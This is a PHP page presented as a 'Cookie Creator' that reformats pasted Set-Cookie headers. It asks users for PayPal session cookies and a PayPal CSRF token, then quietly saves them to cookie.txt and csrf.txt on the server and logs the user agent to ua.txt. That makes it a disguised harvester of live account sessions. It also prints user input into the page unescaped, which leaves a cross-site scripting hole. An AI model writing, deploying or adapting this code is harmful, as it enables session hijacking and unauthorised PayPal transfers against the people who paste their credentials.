<?php

$cookieStr = isset($_REQUEST['c']) ? trim($_REQUEST['c']) : false;
$content = '';
if ($cookieStr && !empty($cookieStr)) {
  $cookieStre = explode("\n", $cookieStr);
  $cookieStrr = '';
  foreach ($cookieStre as $line) {
    $rgx = '/Set\-Cookie\:\s/m';
    $x = preg_replace($rgx, '', $line);
    $x = preg_replace('/\n+/m', ";\s", $x);
    $x = str_replace("\n", '', $x);
    $x = str_replace("\r", '', $x);
    $x = str_replace(PHP_EOL, '', $x);
    $x = str_replace('
      ', '', $x);
    $x = preg_replace('/\s+/', ' ', $x);
    $x .= '; ';
    $cookieStrr .= trim($x) . ' ';
  }
  $cookieStrr = preg_replace('/\;{2,10}|\;(\s|\s+)\;/m', ';', $cookieStrr);
  $cookieStrr = str_replace(['; ;', '; ;'], ';', $cookieStrr);
  $content .= <<<EOF
  <main class="pt-4">
  <div class="alert alert-success">
  <div class="text-center">Result Cookie</div>
  <textarea class="form-control" cols="30" rows="10" class="form-control">{$cookieStrr}</textarea>
  </div>
  </main>
EOF;
  file_put_contents('cookie.txt', $cookieStrr);
}

$csrfStr = isset($_REQUEST['csrf']) ? trim($_REQUEST['csrf']) : false;
if ($csrfStr) {
  $x = (array) json_decode($csrfStr);
  $csrfStrr = isset($x['_csrf']) ? trim($x['_csrf']) : (isset($x['csrf']) ? trim($x['csrf']) : false);
  if ($csrfStrr) {
    file_put_contents('csrf.txt', $csrfStrr);
    $content .= <<<EOF
  <main class="pt-4">
  <div class="alert alert-success">
  <div class="text-center">Result CSRF</div>
  <textarea class="form-control" cols="30" rows="10" class="form-control">{$csrfStrr}</textarea>
  </div>
  </main>
EOF;
  }
}

if (isset($_SERVER['HTTP_USER_AGENT'])) {
  file_put_contents('ua.txt', $_SERVER['HTTP_USER_AGENT']);
}

$title = 'Cookie Creator';
$desc = 'PHP Cookie header to Cookie urlencoded';
$canonical = (isset($_SERVER['HTTPS']) && 'on' === $_SERVER['HTTPS'] ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'] . strtok($_SERVER['REQUEST_URI'], '?');
$content .= <<<EOF
<main class="pt-4">
  <form action="" method="post">
  <div class="text-center mb-2"><a href="https://www.paypal.com/myaccount/money/api/currencies/transfer" target="_blank" rel="noopener noreferrer" class="btn btn-primary">Go currencies transfer page</a> <button class="btn btn-primary" type="button" data-toggle="collapse" data-target="#CLE" aria-expanded="false" aria-controls="CLE">Show Example</button><a href="https://www.telerik.com/" target="_blank" rel="noopener noreferrer" class="btn btn-primary">Download Tools</a></div>

  <div class="collapse" id="CLE">
    <div class="card card-body m-3 p-1">
    <img src="https://raw.githubusercontent.com/dimaslanjaka/Web-Manajemen/master/img/pp/cookie.png" alt="" class="img-fluid" alt="Responsive image" width="100%" height="auto">
    </div>
  </div>
  <textarea name="c" id="" cols="30" rows="10" class="form-control mb-2" placeholder="Set-Cookie: enforce_policy=; Path=/; Domain=paypal.com; Expires=Thu, 01 Jan 1970 00:00:00 GMT; Secure; SameSite=None\nSet-Cookie: _gat_PayPal=; Path=/; Expires=Thu, 01 Jan 1970 00:00:00 GMT; HttpOnly; Secure\nSet-Cookie: LANG=id_ID%3BID; Path=/; Domain=paypal.com; Expires=Thu, 20 Feb 2020 04:14:07 GMT; Max-Age=31556; HttpOnly; Secure; SameSite=None"></textarea>
  <div class="text-center mb-2"><a href="https://www.paypal.com/myaccount/money/api/currencies/transfer" target="_blank" rel="noopener noreferrer" class="btn btn-primary">Go currencies transfer page</a> <button class="btn btn-primary" type="button" data-toggle="collapse" data-target="#CLR" aria-expanded="false" aria-controls="CLR">Show Example</button><a href="https://www.telerik.com/" target="_blank" rel="noopener noreferrer" class="btn btn-primary">Download Tools</a></div>

  <div class="collapse" id="CLR">
    <div class="card card-body m-3 p-1">
    <img src="https://raw.githubusercontent.com/dimaslanjaka/Web-Manajemen/master/img/pp/csrf.png" alt="" class="img-fluid" alt="Responsive image" width="100%" height="auto">
    </div>
  </div>
  <textarea name="csrf" id="" cols="30" rows="10" class="form-control mb-2" placeholder='{"sourceAmount":1,"sourceCurrency":"USD","targetCurrency":"TWD","_csrf":"zpPfZtYZwG+alqfBhfV3ffyxU/nkpiy6uqQ6M="}'></textarea>
  <button class="btn btn-block" type="submit">Submit</button>
  </form>
</main>
EOF;
include __DIR__ . '/content.php';
